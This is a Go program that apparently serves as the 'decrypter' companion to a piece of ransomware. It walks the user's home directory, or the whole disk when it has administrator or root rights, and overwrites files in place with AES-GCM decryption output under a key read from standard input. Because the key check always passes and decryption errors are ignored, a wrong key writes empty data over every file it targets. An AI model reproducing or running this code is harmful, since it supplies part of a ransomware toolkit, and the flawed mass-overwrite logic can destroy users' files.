package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/karrick/godirwalk"
)

var decrypted = make(chan []byte, 255)
var Queue = make(chan string, 255)

var Root string

func isAuthority() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func isRoot() bool {
	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf("[isRoot] Unable to get current user: %s", err)
	}
	fmt.Println(currentUser.Username)
	return currentUser.Username == "root"
}

func MapFiles(Root string) {
	error := godirwalk.Walk(Root, &godirwalk.Options{
		Callback: func(path string, de *godirwalk.Dirent) error {
			if strings.Contains(path, "decrypter") || strings.Contains(path, ".bashrc") || strings.Contains(path, ".zshrc") || strings.Contains(path, ".profile") || strings.Contains(path, "bash") || strings.Contains(path, "sh") || strings.Contains(path, "zsh") || strings.Contains(path, "/.") {
				return nil
			} else if strings.Contains(path, "opt") || strings.Contains(path, "root") || strings.Contains(path, "home") || strings.Contains(path, "media") {
				Queue <- path
				return nil
			} else {
				return nil
			}
		},
		Unsorted: true,
	})

	if error != nil {
		fmt.Println(error)
	}
}

func main() {
	if runtime.GOOS == "windows" {
		//windows
		Root = os.Getenv("USERPROFILE")
		if isAuthority() {
			Root = "C:\\"
		}
	} else {
		//linux
		if isRoot() {
			Root = "/"
		} else {
			Root = os.Getenv("HOME") + "/"
		}
	}
	//dir := "/" // Insert starting directory

	fmt.Print("Decrypter \nInsert decrypt key:")

	reader := bufio.NewReader(os.Stdin)

	text, _ := reader.ReadString('\n')

	text = strings.Replace(text, "\n", "", -1)

	finalText := hex.EncodeToString([]byte(text))

	key, err := hex.DecodeString(finalText)
	if err != nil {
		log.Println(err, "Wrong key.")
	} else {

		go MapFiles(Root)

	loop:
		for {
			select {
			case v := <-Queue:
				file, _ := ioutil.ReadFile(v)
				if len(file) == 0 {
					continue
				}
				go Decrypt(file, key)

				err = ioutil.WriteFile(v, <-decrypted, 0644)
				if err != nil {
					continue
				}
			case <-time.After(10 * time.Second):
				fmt.Println("Files Decrypted")
				break loop
			}
		}
	}

	os.Exit(3)
}

func Decrypt(cypherText []byte, key []byte) {
	block, _ := aes.NewCipher(key)

	gcm, _ := cipher.NewGCM(block)

	plainText, _ := gcm.Open(nil, cypherText[:gcm.NonceSize()], cypherText[gcm.NonceSize():], nil)

	decrypted <- plainText
}
